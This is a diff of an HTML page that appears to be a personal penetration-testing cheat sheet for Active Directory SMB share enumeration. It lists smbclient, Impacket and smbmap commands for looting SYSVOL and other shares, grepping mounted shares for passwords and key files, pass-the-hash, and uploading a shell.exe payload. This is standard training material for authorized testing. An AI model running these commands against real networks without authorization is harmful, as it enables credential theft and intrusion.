+                    <p>Shares are where credentials leak — SYSVOL/NETLOGON hold GPO scripts, and department shares hold config files and spreadsheets. These tools list, read and mount shares to hunt for secrets.</p>
 
                     <h3>smbclient (native)</h3>
+                    <p class="why"><strong>Why list first:</strong> enumerating shares shows what you can reach (including with a null/guest session). SYSVOL is readable by every domain user and is the prime hunting ground for GPP creds and logon scripts.</p>
                     <pre class="cb"><span class="cm"># ── List shares ──────────────────────────────────────────────────────────────</span>
 smbclient -L //DC_IP -U &#x27;username%Password123&#x27;
 smbclient -L //DC_IP -U &#x27;DOMAIN\username%Password123&#x27;
@@ -993,35 +1188,27 @@ smbclient //DC_IP/SHARENAME -U &#x27;username&#x27; -k             # Kerberos
 smbclient //DC_IP/C$ -U &#x27;username%Password123&#x27;           # full C: drive (admin)
 smbclient //DC_IP/ADMIN$ -U &#x27;username%Password123&#x27;       # Windows install dir (admin)
 smbclient //DC_IP/SYSVOL -U &#x27;username%Password123&#x27;       # GPO files — hunt GPP creds
-smbclient //DC_IP/NETLOGON -U &#x27;username%Password123&#x27;     # logon scripts
+smbclient //DC_IP/NETLOGON -U &#x27;username%Password123&#x27;     # logon scripts</pre>
 
-<span class="cm"># ── Inside the smbclient shell ────────────────────────────────────────────────</span>
-<span class="cm"># smb: \&gt;</span>
+                    <h3>Inside the smbclient shell</h3>
+                    <p class="why"><strong>Why <code>prompt off; recurse on</code>:</strong> disables the per-file y/n and walks subdirectories so <code>mget *</code> pulls an entire tree in one go — the fast way to loot a share for offline grepping.</p>
+                    <pre class="cb"><span class="cm"># smb: \&gt;</span>
 ls                           # list current directory
-ls subfolder\                # list specific path
 cd subfolder                 # change directory
-pwd                          # print current remote path
 lcd /local/path              # change LOCAL working directory
 get filename                 # download a file
-get &quot;file with spaces.txt&quot;   # download file with spaces in name
 put /local/file remote_name  # upload a file
-mkdir newdir                 # create remote directory
-rmdir dir                    # remove remote directory
-del filename                 # delete remote file
-rename oldname newname       # rename remote file
 mget *                       # download ALL files in current dir
 mget *.xml                   # download matching files
-mput *.txt                   # upload matching local files
 
 <span class="cm"># Toggle prompts and recursion for bulk operations</span>
 prompt off                   # disable y/n confirmation on mget/mput
 recurse on                   # enable recursive traversal
-mget *                       # now downloads entire directory tree
+mget *                       # now downloads entire directory tree</pre>
 
-<span class="cm"># ── Non-interactive one-liners ────────────────────────────────────────────────</span>
-<span class="cm"># Pass commands with -c (semicolon-separated)</span>
-smbclient //DC_IP/SHARENAME -U &#x27;username%Password123&#x27; \
-  -c &#x27;ls&#x27;
+                    <h3>Non-interactive one-liners</h3>
+                    <p class="why"><strong>Why <code>-c</code>:</strong> scriptable, so you can automate looting across hosts without an interactive session.</p>
+                    <pre class="cb">smbclient //DC_IP/SHARENAME -U &#x27;username%Password123&#x27; -c &#x27;ls&#x27;
 
 <span class="cm"># Recursively download everything in the share</span>
 smbclient //DC_IP/SHARENAME -U &#x27;username%Password123&#x27; \
@@ -1031,20 +1218,17 @@ smbclient //DC_IP/SHARENAME -U &#x27;username%Password123&#x27; \
 smbclient //DC_IP/SHARENAME -U &#x27;username%Password123&#x27; \
   -c &#x27;prompt off; recurse on; lcd /tmp/loot; mget *&#x27;
 
-<span class="cm"># Download a specific file</span>
-smbclient //DC_IP/SHARENAME -U &#x27;username%Password123&#x27; \
-  -c &#x27;get scripts\backup.ps1&#x27;
-
-<span class="cm"># Upload a file (payload delivery)</span>
-smbclient //DC_IP/SHARENAME -U &#x27;username%Password123&#x27; \
-  -c &#x27;put /tmp/shell.exe shell.exe&#x27;
+<span class="cm"># Download a specific file / upload a payload</span>
+smbclient //DC_IP/SHARENAME -U &#x27;username%Password123&#x27; -c &#x27;get scripts\backup.ps1&#x27;
+smbclient //DC_IP/SHARENAME -U &#x27;username%Password123&#x27; -c &#x27;put /tmp/shell.exe shell.exe&#x27;
 
 <span class="cm"># List SYSVOL recursively (hunt for GPP creds / passwords in scripts)</span>
 smbclient //DC_IP/SYSVOL -U &#x27;username%Password123&#x27; \
-  -c &#x27;prompt off; recurse on; ls&#x27;
+  -c &#x27;prompt off; recurse on; ls&#x27;</pre>
 
-<span class="cm"># ── Mount as a filesystem (easier to navigate / grep) ────────────────────────</span>
-sudo mkdir -p /mnt/smb
+                    <h3>Mount as a filesystem</h3>
+                    <p class="why"><strong>Why mount:</strong> turns the share into a local path so you can <code>grep -ri</code> across everything and <code>find</code> for keepass/pfx/unattend files — far faster than clicking through folders.</p>
+                    <pre class="cb">sudo mkdir -p /mnt/smb
 sudo mount -t cifs //DC_IP/SHARENAME /mnt/smb \
   -o username=username,password=&#x27;Password123&#x27;,domain=DOMAIN
 sudo mount -t cifs //DC_IP/SHARENAME /mnt/smb \
@@ -1055,71 +1239,40 @@ grep -ri &#x27;password&#x27; /mnt/smb/ 2&gt;/dev/null
 grep -ri &#x27;pass&#x27; /mnt/smb/ --include=&#x27;*.xml&#x27; --include=&#x27;*.ini&#x27; --include=&#x27;*.config&#x27;
 find /mnt/smb -name &#x27;*.kdbx&#x27; -o -name &#x27;*.pfx&#x27; -o -name &#x27;unattend*&#x27; 2&gt;/dev/null
 
-<span class="cm"># Unmount</span>
 sudo umount /mnt/smb</pre>
 
                     <h3>smbclient.py (Impacket) + smbmap</h3>
+                    <p class="why"><strong>Why smbmap:</strong> it prints the READ/WRITE/NO-ACCESS permission per share up front, so you instantly see which shares are worth your time and which you can write to (payload drop).</p>
                     <pre class="cb"><span class="cm"># ── Connect + list shares ─────────────────────────────────────────────────────</span>
 python3 smbclient.py DOMAIN.LOCAL/username:&#x27;Password123&#x27;@DC_IP
 python3 smbclient.py DOMAIN.LOCAL/username@DC_IP -hashes :NTLMHASH
-python3 smbclient.py DOMAIN.LOCAL/username@DC_IP -hashes LMHASH:NTLMHASH
 
 <span class="cm"># Kerberos (KRB5CCNAME must be set)</span>
 export KRB5CCNAME=ticket.ccache
 python3 smbclient.py DOMAIN.LOCAL/username@DC01.DOMAIN.LOCAL -k -no-pass
 
-<span class="cm"># Null session</span>
-python3 smbclient.py -no-pass //DC_IP
-
 <span class="cm"># ── Inside the smbclient.py shell ────────────────────────────────────────────</span>
-<span class="cm"># Prompt: #&gt;</span>
 shares                            # list all available shares
 use SHARENAME                     # connect to a share (required before ls/get)
 ls                                # list current directory
-ls subfolder/                     # list specific subdirectory
-cd subfolder                      # change directory
-get filename                      # download a file to current local dir
-get filename /local/path/out.txt  # download to specific local path
+get filename                      # download a file
 put /local/file                   # upload a file
-put /local/file remote_name       # upload with different remote name
-mkdir newdir                      # create directory
-rm filename                       # delete file
 cat filename                      # print file contents to stdout
 info                              # connection info (hostname, OS, signing)
-exit                              # disconnect
 
 <span class="cm"># ── Non-interactive with -c ───────────────────────────────────────────────────</span>
-<span class="cm"># List shares without entering the shell</span>
-python3 smbclient.py DOMAIN.LOCAL/username:&#x27;Password123&#x27;@DC_IP \
-  -c &#x27;shares&#x27;
-
-<span class="cm"># Connect to a share and list root</span>
-python3 smbclient.py DOMAIN.LOCAL/username:&#x27;Password123&#x27;@DC_IP \
-  -c &#x27;use C$; ls&#x27;
-
-<span class="cm"># Download a specific file non-interactively</span>
-python3 smbclient.py DOMAIN.LOCAL/username:&#x27;Password123&#x27;@DC_IP \
-  -c &#x27;use SHARENAME; get secrets\passwords.xlsx&#x27;
-
-<span class="cm"># Upload a file non-interactively</span>
-python3 smbclient.py DOMAIN.LOCAL/username:&#x27;Password123&#x27;@DC_IP \
-  -c &#x27;use C$; cd Windows\Temp; put /tmp/shell.exe&#x27;
-
-<span class="cm"># Cat a remote file directly (great for quick credential checks)</span>
+python3 smbclient.py DOMAIN.LOCAL/username:&#x27;Password123&#x27;@DC_IP -c &#x27;shares&#x27;
+python3 smbclient.py DOMAIN.LOCAL/username:&#x27;Password123&#x27;@DC_IP -c &#x27;use C$; ls&#x27;
 python3 smbclient.py DOMAIN.LOCAL/username:&#x27;Password123&#x27;@DC_IP \
   -c &#x27;use SYSVOL; cat DOMAIN.LOCAL/Policies/{GUID}/Machine/Preferences/Groups/Groups.xml&#x27;
 
-<span class="cm"># ── smbmap — permission-aware share listing (complements smbclient) ───────────</span>
+<span class="cm"># ── smbmap — permission-aware share listing ──────────────────────────────────</span>
 smbmap -H DC_IP -u username -p &#x27;Password123&#x27;             # list shares + R/W/NO ACCESS
 smbmap -H DC_IP -u username -p &#x27;Password123&#x27; -r SHARE    # list share contents
 smbmap -H DC_IP -u username -p &#x27;Password123&#x27; -R SHARE    # recursive listing
 smbmap -H DC_IP -u &#x27;&#x27; -p &#x27;&#x27;                              # null session
 smbmap -H DC_IP -u username -p &#x27;Password123&#x27; \
-  --download &#x27;SHARE\path\file.txt&#x27;                       # download specific file
-smbmap -H DC_IP -u username -p &#x27;Password123&#x27; \
-  --upload /local/file &#x27;SHARE\dest.txt&#x27;                  # upload specific file
-smbmap -H DC_IP -u username -H NTLMHASH                  # pass-the-hash</pre>
-
+  --download &#x27;SHARE\path\file.txt&#x27;                       # download specific file</pre>
                 </div>
             </details>
 
@@ -1129,7 +1282,7 @@ smbmap -H DC_IP -u username -H NTLMHASH                  # pass-the-hash</pre>
     <footer>
         <p><i>Imaginary Address, Canada</i></p>
         <p><b>hd</b></p>
-        <p>Last updated : 2026-09-30</p>
+        <p>Last updated : 2026-10-19</p>
         <p class="status"><span class="dot"></span>connection encrypted // session active</p>
         <svg width="100" height="80" viewBox="0 0 100 80">
             <rect x="10" y="10" width="80" height="50" rx="6" ry="6" fill="none" stroke="#7a96aa" stroke-width="3"/>
@@ -1139,5 +1292,22 @@ smbmap -H DC_IP -u username -H NTLMHASH                  # pass-the-hash</pre>
     </footer>
 
     <script src="/terminal.js" defer></script>
+
+    <!-- open the targeted section when a Contents link is clicked / on hash load -->
+    <script>
+        (function () {
+            function openHash() {
+                var id = location.hash.slice(1);
+                if (!id) return;
+                var el = document.getElementById(id);
+                if (el && el.tagName.toLowerCase() === 'details') {
+                    el.open = true;
+                    el.scrollIntoView({ behavior: 'smooth', block: 'start' });
+                }
+            }
+            window.addEventListener('hashchange', openHash);
+            window.addEventListener('load', openHash);
+        })();
+    </script>
 </body>
 </html>
